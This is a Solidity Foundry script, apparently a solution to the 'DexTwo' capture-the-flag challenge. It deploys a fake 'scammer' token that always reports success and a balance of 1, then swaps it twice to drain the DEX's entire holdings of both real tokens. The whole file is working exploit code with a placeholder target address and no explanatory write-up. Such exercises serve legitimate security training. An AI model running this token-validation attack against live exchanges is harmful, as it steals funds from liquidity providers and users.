// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/DexTwo.sol"; // Import DexTwo contract interface
import "forge-std/Script.sol"; // Foundry utilities for scripting



// Foundry script to perform the DexTwo exploit
contract DexTwoExploit is Script {
    DexTwo public dexTwoInstance = DexTwo(0xYourInstanceAddressHere); // Replace with actual DexTwo address
    scammer public maliciousToken;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY")); // Start transaction broadcast

        // Deploy the malicious "scammer" token contract
        maliciousToken = new scammer();

        // Swap the malicious token for the entire balance of token1
        dexTwoInstance.swap(address(maliciousToken), dexTwoInstance.token1(), 1);

        // Swap the malicious token for the entire balance of token2
        dexTwoInstance.swap(address(maliciousToken), dexTwoInstance.token2(), 1);

        vm.stopBroadcast(); // End the broadcast
    }
}

// Malicious token-like contract used to manipulate the DEX liquidity pool
contract scammer {
    // Mimics ERC20 functions without actual implementation

    function transferFrom(address, address, uint256) external returns (bool) {
        return true; // Always returns true to pass DEX checks
    }

    function balanceOf(address) external view returns (uint256) {
        return 1; // Always returns 1, tricking the DEX into thinking it has 1 token
    }

    function approve(address, uint256) external returns (bool) {
        return true; // Always returns true for approval
    }
}


